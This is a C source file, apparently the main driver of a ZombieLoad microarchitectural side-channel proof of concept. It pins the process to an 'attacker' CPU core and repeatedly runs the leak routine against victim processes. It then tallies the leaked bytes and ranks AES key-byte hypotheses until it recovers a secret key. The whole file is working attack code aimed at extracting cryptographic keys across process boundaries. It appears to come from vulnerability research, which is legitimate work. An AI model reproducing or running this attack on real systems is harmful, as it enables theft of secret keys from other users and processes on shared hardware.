#include "main.h"

plaintext* plaintexts;
sample* samples;
size_t num_samples = 200000;
size_t num_samples_per_plaintext = 300;
size_t num_plaintexts;

int main(int argc, char* argv[]) {
	// ################
	//  Initialization
	// ################

	// Set stdout unbuffered (avoids problems when redirecting stdout to a file)
	setbuf(stdout, NULL);

	// Parse Command line arguments: 1st argument overrides num_samples,
	// second argument overrides num_samples_per_plaintext.
	if (argc == 3) {
		if (sscanf(argv[1], "%zu", &num_samples) != 1){
			puts("Invalid command line argument (1)");
			exit(1);
		}
		if (sscanf(argv[2], "%zu", &num_samples_per_plaintext) != 1){
			puts("Invalid command line argument (2)");
			exit(1);
		}
	}
	printf("[MA] Will collect %zu samples.\n", num_samples);
	printf("[MA] Will change the plaintext after (roughly) %zu samples.\n", num_samples_per_plaintext);

	// Execute main process on specific (logical) CPU core
	if (move_process_to_cpu(getpid(), CPU_ATTACKER) != 0) {
		puts("[MA] Error moving main process");
		exit(1);
	}
	printf("[MA] Main process (%d) is running on CPU %d\n", getpid(), sched_getcpu());

	// Initialize PRNG (DEBUG: constant value)
	srand(17);

	// Allocate memory for plaintexts
	num_plaintexts = (num_samples / num_samples_per_plaintext) + 1;
	plaintexts = calloc(num_plaintexts, sizeof(plaintext));
	if (!plaintexts) {
		puts("[MA] Could not allocate memory for plaintexts.");
		exit(1);
	}
	
	// Initialize plaintext structs with random plaintexts
	for (size_t pt = 0; pt < num_plaintexts; pt++) {
		plaintexts[pt].id = pt;
		for (size_t i = 0; i < PLAINTEXT_LENGTH; i++) {
			plaintexts[pt].bytes[i] = rand();
		}
	}
	printf("[MA] Generated %zu plaintexts.\n", num_plaintexts);

	// Allocate memory for samples
	samples = calloc(num_samples, sizeof(sample));
	if (!samples) {
		puts("[MA] Could not allocate memory for samples.");
		exit(1);
	}

	// ############################
	//  Collect ZombieLoad samples
	// ############################
	// This procedure constantly repeats the ZombieLoad attack
	// and also controls the execution of the victim processes.
	// Bytes are leaked from varying positions (byte indices).

	// Save timestamp before sampling
	struct timeval time_start, time_end, time_duration;
	gettimeofday(&time_start, NULL);

	// Collect samples
	zombieload_collect_samples_v2(samples);
	
	// Save timestamp after sampling and print duration and sampling rate
	gettimeofday(&time_end, NULL);
	timersub(&time_end, &time_start, &time_duration);
	double duration = (double)(time_duration.tv_sec) + (double)(time_duration.tv_usec) / 1000000;

	// ##########
	//  Analysis
	// ##########
	// Now that we collected many data samples, we have to analyse them to
	// extract the secret key.

	puts("[MA] Analysis...");

	// Initialize analysis array to store intermediate results
	// * 1st level: Plaintext ID
	// * 2nd level: position
	// * 3rd level: leaked byte
	uint32_t* hist = calloc(num_plaintexts * NUM_POSITIONS * NUM_BYTES, sizeof(uint32_t));
	
	printf("[MA] Fill hist array... ");
	// Go through all samples and count byte occurrences per position.
	for (size_t i = 0; i < num_samples; i++) {
		// increase counter
		*(access_hist(hist, samples[i].ptid, samples[i].pos, samples[i].byte)) += 1;
	}
	printf("Done.\n");

	// Initialize success_ctr array to store per-key-hypothesis results
	// * 1st level: position
	// * 2nd level: leaked byte
	success_ctr_elem success_ctr[NUM_POSITIONS][NUM_BYTES];
	for (uint8_t pos = 0; pos < NUM_POSITIONS; pos++) {
		for (uint16_t b = 0; b < NUM_BYTES; b++) {
			success_ctr[pos][b].byte = b;
			success_ctr[pos][b].count = 0;
		}
	}

	// For each of the 16 byte positions
	for (uint8_t pos = 0; pos < NUM_POSITIONS; pos++) {
		// For each plaintext used
		for (size_t pt = 0; pt < num_plaintexts; pt++) {
			// For each possible value of a key byte
			for (uint16_t keyhyp = 0x00; keyhyp <= 0xff; keyhyp++) {
				// Pre-compute expected intermediate values at this position
				// for the given plain text and key hypothesis
				uint8_t afterAddRoundKey = plaintexts[pt].bytes[pos] ^ keyhyp;
				uint8_t afterSubBytes = aes_sbox[afterAddRoundKey];
				
				// If both values were observed, increase the success_counter
				// of the key hypothesis byte value at the current position
				if (
					*(access_hist(hist, pt, pos, afterAddRoundKey)) > 0
					&& *(access_hist(hist, pt, pos, afterSubBytes)) > 0
				) {
					success_ctr[pos][keyhyp].count += 1;
				}
			}
		}
		// Some output
		for (size_t i = 0; i < NUM_BYTES; i++) {
			if (success_ctr[pos][i].count > 0) {
				printf("Key byte %2d Hyp %.2zx Ctr: %4u\n", pos, i, success_ctr[pos][i].count);
			}
		}
		printf("------\n");
	}
	
	// Finally, print a ranking of the NUM_RANKING most probable key bytes for each position.
	printf("[MA] Ranked Results (Top %d):\n", NUM_RANKING);

	// For each position, find the NUM_RANKING (5) most probable byte values.
	// To do so, sort success_ctr's 2nd level: For each pos, sort the NUM_BYTES (256)
	// counters in descending order. Then, print the NUM_RANKING (5) most frequent bytes.
	for (size_t pos = 0; pos < NUM_POSITIONS; pos++) {
		qsort(success_ctr[pos], NUM_BYTES, sizeof(success_ctr_elem), compare_success_ctr_elem_by_count_desc);
		if (success_ctr[pos][0].count != 0) {
			printf("[MA] Key byte %2zu: ", pos);
			for (size_t rank = 0; rank < NUM_RANKING; rank++) {
				if (success_ctr[pos][rank].count != 0) {
					printf(" %.2x  (%4d) ", success_ctr[pos][rank].byte, success_ctr[pos][rank].count);
				} else {
					printf(" ---------- ");
				}
			}
			puts("");
		}
	}

	// ###################
	//  Exit Main Process
	// ###################
	free(samples);
	free(plaintexts);
	free(hist);

	printf("[MA] Collected %zu samples in %lf seconds (%lf samples/s).\n", num_samples, duration, num_samples / duration);
	puts("[MA] Process execution finished");
	
	return 0;
}
